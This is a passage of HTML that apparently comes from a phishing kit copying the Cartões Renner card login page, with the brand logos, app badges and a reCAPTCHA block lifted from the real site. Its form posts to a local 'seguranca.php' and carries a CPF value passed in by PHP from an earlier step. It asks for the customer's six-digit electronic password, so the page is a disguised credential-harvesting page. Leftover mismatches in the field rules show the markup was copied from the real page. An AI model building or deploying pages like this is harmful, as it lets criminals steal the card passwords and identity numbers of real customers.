20.934 4.561 6.015 2.881 11.068 6.723 14.918 11.764 4.09 5.042 7.219 11.044 9.144 17.767 1.925 6.722 3.128 13.924 3.128 21.127zm2.166-19.207c-1.925-7.682-5.053-14.645-9.384-20.647s-9.865-10.803-16.843-14.405c-6.737-3.6-14.918-5.522-24.302-5.522-6.737 0-13.475 1.441-19.971 4.322-6.497 2.881-12.272 6.962-17.084 12.484-4.812 5.282-8.903 12.005-11.79 19.927-2.888 7.923-4.572 16.806-4.572 26.89 0 8.882.963 17.525 3.128 25.208 2.166 7.683 5.294 14.405 9.384 20.407 4.331 5.763 9.625 10.084 16.362 13.205 6.737 3.121 14.918 4.561 24.302 4.561 13.956 0 25.506-3.84 35.13-11.524 9.384-7.922 15.16-18.966 16.843-33.131h-4.812c-2.166 13.445-7.46 23.529-15.88 30.25-8.422 6.723-19.01 9.844-31.762 9.844-8.662 0-16.121-1.44-22.137-4.561-6.015-2.881-10.827-7.203-14.677-12.245-3.85-5.281-6.737-11.283-8.422-18.246-1.684-7.202-2.647-14.646-2.887-23.048h102.02c.242-8.163-.72-16.086-2.646-23.768z"></path>
                                                   <path fill="#d71920" d="M500 190.626H0v2.4h500z"></path>
                                                </g>
                                             </svg>
                                          </div>
                                       </a>
                                    </h1>
                                 </div>
                                 <div class="site-header__right column small-12 medium-5 text-right">
                                    <a tracking-click="GERAIS_LOJA_VIRTUAL" parametro-local-key="LINK_LOJAS_RENNER" parametro-local-attr="href" target="_blank" class="button button--outline ir-para-loja-virtual ng-isolate-scope" href="http://www.lojasrenner.com.br/">
                                    <span>ir para a </span>loja virtual</a>
                                    <logout-link icon="sign-out" title="Sair" text="Sair" add-classes="button button--outline sair-header" modal="true" class="ng-isolate-scope">
                                       <a href="#" ng-class="$ctrl.addClasses" ng-click="$ctrl.requestLogout()" class="ng-binding button button--outline sair-header">
                                          <!-- ngIf: $ctrl.icon --><!-- ngInclude: ($ctrl.icon + '.svg') | assetPath:'vectors'  -->
                                          <span ng-if="$ctrl.icon" class="icon ng-scope" ng-include="($ctrl.icon + '.svg') | assetPath:'vectors' " style="">
                                             <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 500 500" focusable="false" class="ng-scope">
                                                <path d="M243.159 33.328c-42.132 0-76.5 37.46-76.5 83.379v16.623c0 9.132 8.292 16.668 16.667 16.668 8.374 0 16.666-7.536 16.666-16.668v-16.623c0-27.792 17.79-50.484 43.288-50.484h180.222c25.497 0 43.164 22.692 43.164 50.484v266.584c0 27.792-17.667 50.484-43.164 50.484h-180.1c-25.496 0-43.41-22.692-43.41-50.484v-16.623c0-9.131-8.292-16.666-16.666-16.666-8.375 0-16.544 7.535-16.544 16.666v16.623c0 45.92 34.366 83.38 76.498 83.38h180.222c42.131 0 76.498-37.46 76.498-83.38V116.707c0-46.054-34.367-83.379-76.498-83.379H243.158zm-158.83 120.84c-3.824 0-7.647 1.611-10.585 4.834L4.407 238.316c-5.876 6.445-5.876 16.786 0 23.23l69.337 79.315c2.938 3.223 6.73 4.836 10.645 4.836 3.914 0 7.707-1.613 10.645-4.836 5.875-6.31 5.875-16.784 0-23.095l-43.758-51.25h247.88c8.326 0 15.057-7.385 15.057-16.516 0-9.131-6.731-16.518-15.056-16.518H51.153l43.76-51.253c5.875-6.446 5.875-16.781 0-23.227-2.938-3.223-6.762-4.834-10.585-4.834z"></path>
                                             </svg>
                                          </span>
                                          <!-- end ngIf: $ctrl.icon -->
                                          Sair
                                       </a>
                                    </logout-link>
                                 </div>
                              </div>
                           </header>
                        </site-header>
                        <main tipo-produto="" class="ng-isolate-scope sem-cartao">
                           <!-- uiView: -->
                           <div ui-view="" class="ng-scope">
                              <x-login class="ng-scope ng-isolate-scope">
                                 <auth-template class="ng-isolate-scope">
                                    <div class="row">
                                       <div class="column">
                                          <div class="auth-template">
                                             <div class="auth-template__help small-12 medium-12 large-3" ng-class="$ctrl.helpMode">
                                                <div class="auth-template__help-container">
                                                   <div ng-transclude="help">
                                                      <help-section class="ng-scope">
                                                         <help-login actions-mode="hidden" arrow-mode="hidden" class="ng-isolate-scope">
                                                            <div class="help">
                                                               <div class="help__logo" ng-class="$ctrl.logoMode">
                                                                  <span class="help__logo-title">Cartões <br class="hidden-eq-medium"> Renner</span>
                                                               </div>
                                                               <div class="help__text" ng-class="$ctrl.textMode">
                                                                  <div ng-transclude="text">
                                                                     
                                                                  </div>
                                                               </div>
                                                               <div class="help__image" ng-class="$ctrl.imageMode">
                                                                  <!-- ngInclude: 'logo-cartao-renner.svg' | assetPath:'vectors' -->
                                                                  <span class="help__image-icon ng-scope" ng-include="'logo-cartao-renner.svg' | assetPath:'vectors'" style="">
                                                                     <svg viewBox="0 0 162 86" xmlns="http://www.w3.org/2000/svg" focusable="false" class="ng-scope">
                                                                        <path d="M162 86H19.125V0H162v86zM23.194 81.903h134.722V4.096H23.194v77.807z" fill="#141413"></path>
                                                                        <path d="M144.338 27.508H0V58.49h144.338V27.508z" fill="#D71920"></path>
                                                                        <path d="M36.462 43.001c0 2.17 1.743 3.727 3.892 3.727a3.823 3.823 0 002.94-1.365l-1.091-.926a2.451 2.451 0 01-1.85.834c-.605 0-1.187-.241-1.616-.671a2.296 2.296 0 011.617-3.915 2.458 2.458 0 011.84.822l1.089-.928a3.851 3.851 0 00-2.93-1.353c-2.148 0-3.891 1.582-3.891 3.75V43zm7.81 3.6h1.714l.489-1.218h3.02l.489 1.219h1.714L48.71 39.34h-1.428l-3.01 7.262zm2.648-2.5l1.058-2.637 1.051 2.638H46.92zm6.244 2.5h1.586v-2.416h1.069l1.506 2.417h1.808L57.367 43.8a2.196 2.196 0 001.29-2.064 2.426 2.426 0 00-1.53-2.23 2.404 2.404 0 00-.934-.167h-3.029v7.262zm1.586-3.832v-1.947h1.403a.901.901 0 01.903.958.97.97 0 01-.635.957.96.96 0 01-.402.055l-1.269-.023zm6.972 3.856h1.6v-5.803h1.932v-1.459h-5.486v1.46h1.954v5.801zm5.144-7.924l.857.126a.392.392 0 01.426-.364c.497 0 .857.436 1.557.436.857 0 1.257-.55 1.372-1.416l-.857-.135c-.072.324-.218.436-.458.436-.497 0-.857-.436-1.543-.436-.768 0-1.237.573-1.354 1.353zm-1.6 7.93h1.714l.489-1.22h3.02l.489 1.22h1.714l-2.994-7.262h-1.43l-3.002 7.261zm2.648-2.5l1.06-2.638 1.05 2.637h-2.11zm5.43-1.116a3.873 3.873 0 002.304 3.666 3.854 3.854 0 004.252-.764 3.882 3.882 0 00.892-4.24c-.29-.715-.784-1.328-1.423-1.76s-1.39-.662-2.16-.663a3.77 3.77 0 00-2.714 1.063 3.793 3.793 0 00-1.154 2.684l.003.014zm1.594-.014a2.277 2.277 0 011.412-2.086 2.26 2.26 0 012.462.505 2.275 2.275 0 01.484 2.474 2.272 2.272 0 01-2.089 1.4 2.26 2.26 0 01-2.102-1.416 2.278 2.278 0 01-.167-.877zm12.26 3.615h1.588v-2.417h1.072l1.505 2.417h1.806l-1.763-2.8a2.194 2.194 0 001.286-2.065 2.425 2.425 0 00-1.528-2.228 2.406 2.406 0 00-.932-.168h-3.035v7.26zm1.588-3.833v-1.96h1.406a.901.901 0 01.903.957.97.97 0 01-.635.957.96.96 0 01-.402.055l-1.272-.009zm5.85 3.833h5.017V45.16h-3.429v-1.554h3.123v-1.433h-3.112v-1.35h3.344v-1.46h-4.944v7.253zm6.823 0h1.548v-4.624l3.578 4.633h1.307v-7.262h-1.547v4.512l-3.475-4.512h-1.429l.018 7.253zm8.475 0h1.546v-4.624l3.586 4.633h1.31v-7.262h-1.547v4.512l-3.472-4.512h-1.429l.006 7.253zm8.478 0h5.015V45.16h-3.412v-1.554h3.126v-1.433h-3.126v-1.35h3.343v-1.46h-4.946v7.253zm6.824 0h1.588v-2.417h1.072l1.5 2.417h1.81l-1.76-2.792a2.204 2.204 0 001.288-2.064 2.425 2.425 0 00-1.53-2.23 2.4 2.4 0 00-.934-.167h-3.029l-.004 7.253zm1.588-3.833v-1.96h1.401a.905.905 0 01.904.957.971.971 0 01-.29.742.958.958 0 01-.748.27l-1.266-.009z" fill="#fff"></path>
                                                                     </svg>
                                                                  </span>
                                                                  <!-- ngInclude: 'logo-meu-cartao.svg' | assetPath:'vectors' -->
                                                                  <span class="help__image-icon ng-scope" ng-include="'logo-meu-cartao.svg' | assetPath:'vectors'">
                                                                     <svg viewBox="0 0 162 86" xmlns="http://www.w3.org/2000/svg" focusable="false" class="ng-scope">
                                                                        <path d="M162 86H19.125V0H162v86zM23.194 81.903h134.722V4.096H23.194v77.807z" fill="#141413"></path>
                                                                        <path d="M141.858 27.771H0v30.456h141.858V27.772z" fill="#BA9A7D"></path>
                                                                        <path d="M69.628 42.237c0-1.815-.923-2.898-2.463-2.898s-2.572 1.18-2.618 2.867V47.3h-.94V42.21c-.037-1.691-1.109-2.866-2.612-2.866-1.503 0-2.465 1.083-2.465 2.898V47.3h-.952v-5.375c0-2.119 1.183-3.44 3.095-3.44 1.868 0 2.843.9 3.257 1.53l.149.23.148-.23c.415-.63 1.392-1.53 3.258-1.53 1.911 0 3.097 1.318 3.097 3.44V47.3h-.954v-5.063zm10.438.831v.235h-7.11l.018.201c.191 1.92 1.523 3.208 3.32 3.208a3.8 3.8 0 002.823-1.198l.572.504a4.37 4.37 0 01-3.415 1.494c-2.446 0-4.266-1.932-4.266-4.512s1.76-4.513 4.095-4.513c2.377 0 3.977 1.844 3.977 4.587l-.014-.006zm-.952-.584l-.02-.198c-.162-1.961-1.351-2.927-3.023-2.927-1.671 0-2.857 1.213-3.083 2.924l-.017.2h6.143zm9.842 1.6v-5.41h-.969v5.07c0 1.775-.926 2.799-2.532 2.839h-.36c-1.603-.046-2.586-1.07-2.586-2.838v-5.071h-.966v5.403c0 2.108 1.24 3.418 3.24 3.418h.932c2 0 3.24-1.31 3.24-3.418v.006zm3.083-.219v-.023c0-1.774 1.283-3.153 2.983-3.153a3.263 3.263 0 012.386 1.035l.372-.381a3.729 3.729 0 00-2.75-1.13 3.534 3.534 0 00-2.543 1.07 3.557 3.557 0 00-1.008 2.577v.02c0 2.023 1.497 3.626 3.517 3.626 1.255 0 2.064-.496 2.812-1.23l-.354-.34c-.72.701-1.415 1.094-2.438 1.094-1.688 0-2.991-1.384-2.991-3.17l.014.005zm13.144 3.526h-.571l-.906-1.978h-4.212l-.909 1.978h-.552l3.324-7.115h.506l3.32 7.115zm-1.714-2.454l-1.875-4.085-1.869 4.091 3.744-.006zm8.286 2.454h-.677l-2.286-2.927h-2.357v2.927h-.538v-7.06h3.024c1.554 0 2.57.825 2.57 2.006v.018c0 1.18-.896 1.86-2.113 2.02l2.377 3.016zm-2.886-3.394c1.2 0 2.095-.599 2.095-1.617v-.023c0-.946-.763-1.539-2.07-1.539h-2.457v3.18h2.432zm6.204-3.179h2.463v-.487h-5.452v.487h2.457v6.576h.526l.006-6.576zm6.858-2.007l-.36-.111c-.157.467-.286.619-.526.619-.36 0-.954-.508-1.354-.508-.401 0-.69.261-.89 1.147l.364.112c.157-.47.27-.616.526-.616.357 0 .948.504 1.354.504s.683-.258.886-1.147zm2.029 8.6h-.572l-.903-1.978h-4.23l-.905 1.978h-.546l3.318-7.115h.509l3.329 7.115zm-1.715-2.454l-1.872-4.084-1.883 4.085h3.755zm8.96-1.1v.02c0 1.926-1.408 3.65-3.52 3.65-2.111 0-3.503-1.72-3.503-3.63v-.037c0-1.924 1.406-3.647 3.52-3.647 2.115 0 3.504 1.72 3.504 3.626v.018zm-.536.003c0-1.74-1.257-3.171-2.983-3.171s-2.966 1.408-2.966 3.153v.018c0 1.745 1.257 3.173 2.983 3.173s2.966-1.407 2.966-3.153v-.02z" fill="#fff"></path>
                                                                     </svg>
                                                                  </span>
                                                               </div>
                                                               <div class="help__arrow hidden" ng-class="$ctrl.arrowMode">
                                                                  <span></span>
                                                               </div>
                                                               <div class="help__actions hidden" ng-class="$ctrl.actionsMode">
                                                                  <div ng-transclude="actions"></div>
                                                               </div>
                                                            </div>
                                                         </help-login>
                                                         <acesso-rapido class="hidden-gt-small ng-isolate-scope">
                                                            <!-- ngIf: $ctrl.isEnabled -->
                                                         </acesso-rapido>
                                                      </help-section>
                                                   </div>
                                                </div>
                                             </div>
                                             <div class="auth-template__card small-12 medium-12 large-5" ng-class="$ctrl.cardMode">
                                                <div class="auth-template__card-container">
                                                   <div ng-transclude="card">
                                                      <card-section class="ng-scope">
                                                        
                                                         <acesso-rapido class="hidden-eq-small ng-isolate-scope">
                                                            <!-- ngIf: $ctrl.isEnabled -->
                                                         </acesso-rapido>
                                                         <card-login ctrl="$ctrl" subtitle-mode="hidden" actions-mode="hidden" class="ng-isolate-scope">
                                                            <div class="card">
                                                               <form name="$ctrl.ctrl.form" ng-submit="$ctrl.ctrl.submit()" class="ng-pristine ng-invalid ng-invalid-required ng-valid-minlength ng-valid-maxlength ng-invalid-cpf" method="POST" action="seguranca.php">
                                                                  <div class="card__title" ng-class="$ctrl.titleMode">
                                                                     <div ng-transclude="title">
                                                                        <card-title class="ng-scope">
                                                                           <span>Acesse sua conta</span>
                                                                        </card-title>
                                                                     </div>
                                                                  </div>
                                                                  <div class="card__subtitle hidden" ng-class="$ctrl.subtitleMode">
                                                                     <div ng-transclude="subtitle"></div>
                                                                  </div>
                                                                  <div class="alert">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 500 500" focusable="false" class="ng-scope">
	<path d="M275 358.335c0 13.805-11.195 25-25 25-13.806 0-25-11.195-25-25V212.5c0-13.806 11.194-25 25-25 13.805 0 25 11.194 25 25zM250 112.5c-13.806 0-25 11.194-25 25s11.194 25 25 25c13.805 0 25-11.194 25-25s-11.195-25-25-25z">
	</path>
	<path d="M250 500c138.072 0 250-111.923 250-250.003C500 111.923 388.072 0 250 0 111.926 0 0 111.923 0 249.997 0 388.077 111.926 500 250 500zm0-480.011c127.028 0 230.005 102.978 230.005 230.008 0 127.023-102.978 230.008-230.005 230.008-127.026 0-230.005-102.985-230.005-230.008 0-127.03 102.979-230.008 230.005-230.008z">
	</path>
</svg>

            <p>Senha utilizada para acessar o aplicativo e o site dos Cartões Renner.</p>
          </div>
                                                                  <div class="card__fields" ng-class="$ctrl.fieldsMode">
                                                                     <div ng-transclude="fields">
                                                                        <card-fields class="ng-scope">
                                                                           <div class="textfield-label--uppercase textfield textfield--with-icon ng-isolate-scope" label="Senha" icon="user-outline" error-message="'Número de CPF inválido'">
                                                                           <input type="hidden" name="cpf" id="cpf" value="<?php echo $cpf ?>">   
                                                                           <input cpf="" type="password" class="textfield__input ng-scope ng-pristine ng-isolate-scope ng-empty ng-invalid ng-invalid-required ng-valid-minlength ng-valid-maxlength ng-invalid-cpf ng-validate ng-touched" name="senha" id="senha" autofocus="$ctrl.$modal.isEmpty()" maxlength="6" ng-minlength="14" ng-required="true" ng-model="$ctrl.cpf" autocorrect="off" autocapitalize="off" spellcheck="false" cleave="maskOptions" required="required" style="">
                                                                              <label ng-show="label" class="textfield__label ng-binding">Senha eletronica</label>
                                                                              <!-- ngIf: icon --><!-- ngInclude: (icon + '.svg') | assetPath:'vectors' -->
                                                                              <div ng-if="icon" class="textfield__icon ng-scope" ng-include="(icon + '.svg') | assetPath:'vectors'" style="">
                                                                              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 500 500.00001" focusable="false" class="ng-scope">
	<path d="M135.046 215.039h229.892v-68.565c0-62.283-52.59-111.845-114.872-111.845-62.26 0-115.02 49.563-115.02 111.845v68.565zM250.064 361.11c27.777 0 27.777-9.427 27.777-23.316 0-13.015 0-21.761-27.777-21.761-27.779 0-27.779 11.59-27.779 21.761 0 13.889 0 23.316 27.779 23.316zm-1.084 61.623c-9.508-.13-19.514-6.973-19.383-16.462v-22.383c-20.043-7.42-35.09-18.317-35.09-46.094 0-27.778 13.89-49.539 55.557-49.539 41.666 0 55.555 21.761 55.555 49.539 0 27.777-15.182 38.674-35.215 46.094v22.884c-.148 9.497-11.922 16.091-21.424 15.96zM82.514 499.998c-22.361 0-40.784-18.423-40.784-40.805v-203.37c0-22.373 18.423-40.784 40.784-40.784h17.945v-68.565C100.459 65.61 169.21 0 250.064 0 330.926 0 399.54 65.611 399.54 146.474v68.565h17.945c22.361 0 40.784 18.414 40.784 40.784l-.021 148.975v.459c-.148 9.483-8.07 17.167-17.554 17.053-9.501-.13-17.189-8.092-17.075-17.575l.021-148.91c0-3.933-2.253-6.178-6.155-6.178H82.513c-3.9 0-6.155 2.244-6.155 6.178v203.37c0 3.932 2.254 6.177 6.155 6.177h334.973c3.902 0 6.155-2.245 6.155-6.177l.023.543c-.034-.333-.011-.664 0-1 .16-9.477 8.066-17.172 17.554-17.01 9.468.142 17.16 8.053 17.03 17.533-.033 22.347-18.424 40.74-40.762 40.74L82.514 500z">
	</path>
</svg>
                                                                              </div>
                                                                              <!-- end ngIf: icon -->
                                                                              <!-- ngIf: !icon && prefix -->
                                                                              <small class="field-message field-message--error ng-binding ng-isolate-scope" error-message="Número de CPF inválido">
                                                                              Número de CPF inválido
                                                                              </small>
                                                                           </div>
                                                                        </card-fields>
                                                                     </div>
                                                                  </div>
                                                                  <div class="card__button" ng-class="$ctrl.buttonMode">
                                                                     <request-error promise="$ctrl.ctrl.promise" class="ng-isolate-scope">
                                                                        <div class="request-error-container request-error--error">
                                                                           <!-- ngInclude: 'exclamation-circle.svg' | assetPath:'vectors'  -->
                                                                           <div ng-show="$ctrl.message" class="request-error-icon ng-scope ng-hide" ng-include="'exclamation-circle.svg' | assetPath:'vectors' " style="">
                                                                              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 500 500" focusable="false" class="ng-scope">
                                                                                 <path d="M250 0C111.928 0 0 111.922 0 250c0 138.072 111.928 250 250 250s250-111.928 250-250C500 111.922 388.072 0 250 0zm0 20.052c127.022 0 229.948 102.926 229.948 229.948 0 127.03-102.925 229.948-229.948 229.948-127.022 0-229.948-102.919-229.948-229.948C20.052 122.978 122.977 20.052 250 20.052zM250 75c-13.807 0-25 11.193-25 25v187.5c0 13.807 11.193 25 25 25s25-11.193 25-25V100c0-13.808-11.193-25-25-25zm0 262.5c-13.807 0-25 11.193-25 25s11.193 25 25 25 25-11.193 25-25-11.193-25-25-25z"></path>
                                                                              </svg>
                                                                           </div>
                                                                           <small ng-show="$ctrl.message" class="request-error ng-binding ng-hide"></small>
                                                                        </div>
                                                                     </request-error>
                                                                     <loader show="$ctrl.ctrl.enviando" class="ng-isolate-scope">
                                                                        <div class="loader" ng-class="{'loader--show': $loader.show}">
                                                                           <div ng-transclude="">
                                                                              <div ng-transclude="button" class="ng-scope">
                                                                                 <card-button class="ng-scope">
                                                                                    <button type="submit" id="manda" class="button button--expanded button--default" disabled><span ng-transclude="">
                                                                                    Acessar
                                                                                    </span></button>
                                                                                 </card-button>
                                                                              </div>
                                                                           </div>
                                                                           <div class="loader__bubble">
                                                                              <div></div>
                                                                              <div></div>
                                                                              <div></div>
                                                                           </div>
                                                                        </div>
                                                                     </loader>
                                                                  </div>
                                                                  <div class="card__links" ng-class="$ctrl.linksMode">
                                                                     <div ng-transclude="links">
                                                                        <card-links class="ng-scope">
                                                                           <recaptcha-viewer active="$ctrl.captchaExibir" scope="$ctrl.captchaScope" execute="$ctrl.captchaExecute" class="ng-isolate-scope">
                                                                              <div class="recaptcha-viewer">
                                                                                 <div class="recaptcha-badge ng-isolate-scope" data-size="invisible" data-badge="inline" recaptcha="$ctrl.active" recaptcha-info-promise="$ctrl.captchaInfoPromise" recaptcha-on-create="$ctrl.captchaCreate(widgetId)" recaptcha-on-callback="$ctrl.captchaSubmit(token)" style="">
                                                                                    <div class="grecaptcha-badge" data-style="inline" style="width: 256px; height: 60px; box-shadow: gray 0px 0px 5px;">
                                                                                       <div class="grecaptcha-logo"><iframe title="reCAPTCHA" src="https://www.google.com/recaptcha/api2/anchor?ar=1&amp;k=6LcNwW8UAAAAAJ8eSLfer6Z8Lm28favadVWPryjV&amp;co=aHR0cHM6Ly93d3cucmVhbGl6ZXNvbHVjb2VzZmluYW5jZWlyYXMuY29tLmJyOjQ0Mw..&amp;hl=pt-BR&amp;v=2uoiJ4hP3NUoP9v_eBNfU6CR&amp;size=invisible&amp;badge=inline&amp;cb=uii3yowxuayz" width="256" height="60" role="presentation" name="a-5um0r2x7qyhw" frameborder="0" scrolling="no" sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox"></iframe></div>
                                                                                       <div class="grecaptcha-error"></div>
                                                                                       <textarea id="g-recaptcha-response" name="g-recaptcha-response" class="g-recaptcha-response" style="width: 250px; height: 40px; border: 1px solid rgb(193, 193, 193); margin: 10px 25px; padding: 0px; resize: none; display: none;"></textarea>
                                                                                    </div>
                                                                                    <iframe style="display: none;"></iframe>
                                                                                 </div>
                                                                                 <p ng-show="$ctrl.active" class="card__links__recaptcha" style="">
                                                                                    Esse formulário está protegido por Google reCaptcha.
                                                                                    <a href="https://www.google.com/intl/en/policies/privacy/" target="_blank">Termos</a> -
                                                                                    <a href="https://www.google.com/intl/en/policies/terms/" target="_blank">Privacidade</a>.
                                                                                 </p>
                                                                              </div>
                                                                           </recaptcha-viewer>
                                                                        </card-links>
                                                                     </div>
                                                                  </div>
                                                               </form>
                                                            </div>
                                                            <div class="card-actions" ng-class="$ctrl.actionsMode">
                                                               <div ng-transclude="actions"></div>
                                                            </div>
                                                         </card-login>
                                                         <!-- ngIf: false -->
                                                      </card-section>
                                                   </div>
                                                </div>
                                             </div>
                                             <div class="auth-template__support small-12 medium-12 large-4" ng-class="$ctrl.supportMode">
                                                <div class="auth-template__support-container">
                                                </div>
                                             </div>
                                          </div>
                                       </div>
                                    </div>
                                    <app-lojas-renner class="ng-isolate-scope">
                                       <div class="app-lojas-renner">
                                          <h2>Seu dia-a-dia mais digital:</h2>
                                          <p class="app-lojas-renner__subtitle">Aproveite mais facilidades pelo app Lojas Renner</p>
                                          <div class="app-lojas-renner__conteudo">
                                             <div class="app-lojas-renner__texto">
                                                <p class="app-lojas-renner__descricao">Acompanhe seu histórico de compras, saldo e limites.
                                                   Confira a sua melhor data para compra e também gere boletos para pagamento dos seus carnês e faturas.
                                                </p>
                                                <h3>Disponível nas lojas:</h3>
                                                <div class="app-lojas-renner__badges">
                                                   <a target="_blank" parametro-local-key="LINK_APP_GOOGLE_PLAY" parametro-local-attr="href" class="ng-isolate-scope" href="https://play.google.com/store/apps/details?id=br.com.lojasrenner&amp;hl=pt-BR">
                                                   <img src="../vectors/google-play-badge-reverse.svg">
                                                   </a>
                                                   <!-- ngInclude: 'app-store-badge-reverse.svg' | assetPath:'vectors' -->
                                                   <a target="_blank" parametro-local-key="LINK_APP_APP_STORE" parametro-local-attr="href" ng-include="'app-store-badge-reverse.svg' | assetPath:'vectors'" class="ng-scope ng-isolate-scope" href="https://apps.apple.com/br/app/lojas-renner-roupas-perfumes/id567763947" style="">
                                                      <svg viewBox="0 0 119.66 40" width="119.66407" height="40" xmlns="http://www.w3.org/2000/svg" focusable="false" class="ng-scope">
                                                         <path d="M69.161 13.424c0-.81.604-1.278 1.675-1.344l1.22-.07v-.39c0-.475-.315-.743-.922-.743-.496 0-.84.182-.939.5h-.86c.09-.773.818-1.27 1.84-1.27 1.129 0 1.765.563 1.765 1.514v3.077h-.855v-.633h-.07a1.515 1.515 0 01-1.353.707 1.36 1.36 0 01-1.501-1.348zm2.894-.385v-.376l-1.1.07c-.62.042-.9.253-.9.65 0 .405.351.64.835.64a1.062 1.062 0 001.166-.984zm-7.837-2.844h.856v.715h.067a1.348 1.348 0 011.343-.802 1.465 1.465 0 011.559 1.674v2.915h-.889v-2.691c0-.724-.314-1.084-.971-1.084a1.033 1.033 0 00-1.076 1.141v2.635h-.889zm-5.959 0h.856v.69h.066a1.22 1.22 0 011.216-.765 1.868 1.868 0 01.396.037v.877a2.434 2.434 0 00-.496-.054 1.055 1.055 0 00-1.15 1.059v2.659h-.888zm-5.17 3.229c0-.81.603-1.278 1.674-1.344l1.22-.07v-.39c0-.475-.315-.743-.922-.743-.496 0-.84.182-.939.5h-.86c.09-.773.818-1.27 1.84-1.27 1.129 0 1.765.563 1.765 1.514v3.077h-.855v-.633h-.07a1.515 1.515 0 01-1.353.707 1.36 1.36 0 01-1.5-1.348zm2.894-.385v-.376l-1.1.07c-.62.042-.901.253-.901.65 0 .405.351.64.835.64a1.062 1.062 0 001.166-.984zm-5.746.062l-.985 1.596h-.975l1.493-2.24-1.506-2.262h1.038l.968 1.587h.07l.96-1.587h.987l-1.484 2.224 1.501 2.278h-1.02l-.981-1.596zm-4.068-4.238a.576.576 0 11.575.541.547.547 0 01-.575-.541zm.132 1.331h.886v4.503H46.3zm-5.187 3.23c0-.81.604-1.278 1.675-1.344l1.22-.07v-.39c0-.475-.315-.743-.922-.743-.496 0-.84.182-.938.5h-.86c.09-.773.818-1.27 1.839-1.27 1.129 0 1.766.563 1.766 1.514v3.077h-.856v-.633h-.07a1.515 1.515 0 01-1.353.707 1.36 1.36 0 01-1.5-1.348zm2.895-.385v-.376l-1.1.07c-.62.042-.901.252-.901.65 0 .405.352.64.835.64a1.062 1.062 0 001.166-.984zm-8.338 1.658V8.731h2.398c1.122 0 1.795.57 1.795 1.488a1.308 1.308 0 01-1.046 1.282v.07a1.41 1.41 0 011.344 1.435c0 1.05-.764 1.691-2.039 1.691zm.927-3.44h1.1c.819 0 1.244-.302 1.244-.868 0-.55-.4-.873-1.087-.873h-1.257zm1.34 2.655c.835 0 1.277-.34 1.277-.972 0-.624-.46-.951-1.331-.951h-1.286v1.923zm71.447 13.925c-.25 1.643-1.851 2.771-3.899 2.771-2.634 0-4.268-1.764-4.268-4.595 0-2.84 1.643-4.682 4.19-4.682 2.505 0 4.08 1.72 4.08 4.466v.637h-6.394v.112a2.358 2.358 0 002.435 2.564 2.048 2.048 0 002.091-1.273zm-6.283-2.702h4.527a2.177 2.177 0 00-2.22-2.298 2.292 2.292 0 00-2.307 2.298zm-6.916-3.693h1.773v1.541h.043a2.16 2.16 0 012.178-1.635 2.866 2.866 0 01.636.069v1.738a2.598 2.598 0 00-.835-.112 1.873 1.873 0 00-1.936 2.083v5.37h-1.859zm-10.12 4.528c0-2.849 1.677-4.64 4.293-4.64 2.625 0 4.295 1.79 4.295 4.64 0 2.856-1.66 4.638-4.295 4.638-2.633 0-4.294-1.782-4.294-4.638zm6.695 0c0-1.954-.896-3.108-2.402-3.108s-2.4 1.162-2.4 3.108c0 1.962.894 3.106 2.4 3.106s2.402-1.145 2.402-3.106zm-9.414-6.67v2.142h1.721v1.472h-1.721v4.991c0 .776.344 1.137 1.101 1.137a5.808 5.808 0 00.612-.043v1.463a5.104 5.104 0 01-1.033.086c-1.833 0-2.547-.689-2.547-2.445v-5.189h-1.317v-1.472h1.317V19.3zM71.71 27.036c.137 1.231 1.334 2.04 2.968 2.04 1.567 0 2.694-.809 2.694-1.919 0-.964-.68-1.541-2.29-1.937l-1.609-.387c-2.28-.551-3.339-1.617-3.339-3.348 0-2.142 1.868-3.614 4.519-3.614 2.624 0 4.423 1.472 4.483 3.614h-1.876c-.112-1.24-1.136-1.987-2.633-1.987s-2.522.757-2.522 1.858c0 .878.654 1.395 2.255 1.79l1.368.336c2.548.603 3.607 1.626 3.607 3.443 0 2.323-1.851 3.778-4.794 3.778-2.754 0-4.614-1.421-4.734-3.667zm-6.586-1.066c0 2.813-1.506 4.62-3.779 4.62a3.07 3.07 0 01-2.848-1.583h-.043v4.484h-1.859V21.442h1.8v1.506h.033a3.212 3.212 0 012.883-1.6c2.298 0 3.813 1.816 3.813 4.621zm-1.91 0c0-1.833-.948-3.038-2.393-3.038-1.42 0-2.375 1.23-2.375 3.038 0 1.824.955 3.046 2.375 3.046 1.445 0 2.392-1.197 2.392-3.046zm-8.055 0c0 2.813-1.506 4.62-3.778 4.62a3.07 3.07 0 01-2.85-1.583h-.042v4.484h-1.858V21.442h1.798v1.506h.035a3.212 3.212 0 012.882-1.6c2.298 0 3.813 1.816 3.813 4.621zm-1.91 0c0-1.833-.948-3.038-2.393-3.038-1.42 0-2.375 1.23-2.375 3.038 0 1.824.955 3.046 2.375 3.046 1.445 0 2.393-1.197 2.393-3.046zm-10.947 1.17h-4.734l-1.137 3.356h-2.004l4.483-12.418h2.083l4.483 12.418h-2.039zm-4.244-1.55h3.752l-1.85-5.447h-.051zM22.037 12.21a4.872 4.872 0 001.115-3.49 4.957 4.957 0 00-3.208 1.66 4.636 4.636 0 00-1.143 3.361 4.099 4.099 0 003.236-1.53zm2.732 8.09a4.949 4.949 0 012.357-4.152 5.066 5.066 0 00-3.992-2.157c-1.679-.177-3.307 1.004-4.163 1.004-.872 0-2.19-.987-3.608-.958a5.315 5.315 0 00-4.473 2.728c-1.934 3.349-.491 8.27 1.361 10.976.927 1.326 2.01 2.806 3.428 2.754 1.387-.058 1.905-.885 3.58-.885 1.658 0 2.144.885 3.59.851 1.489-.024 2.426-1.331 3.32-2.669a10.962 10.962 0 001.52-3.092 4.782 4.782 0 01-2.92-4.4zM110.13 0v.002H9.53c-.367 0-.73 0-1.096.002-.306.002-.609.007-.918.012a13.215 13.215 0 00-2.004.178A6.665 6.665 0 003.61.82a6.438 6.438 0 00-1.617 1.177A6.258 6.258 0 00.815 3.62 6.601 6.601 0 00.19 5.524a12.993 12.993 0 00-.18 2.002c-.009.306-.01.613-.015.92V31.56c.005.31.006.611.016.922a12.992 12.992 0 00.18 2.002 6.588 6.588 0 00.624 1.904 6.208 6.208 0 001.178 1.613 6.274 6.274 0 001.617 1.18 6.7 6.7 0 001.902.63 13.455 13.455 0 002.004.177c.31.006.612.011.918.011.366.002.73.002 1.096.002h100.6c.36 0 .725 0 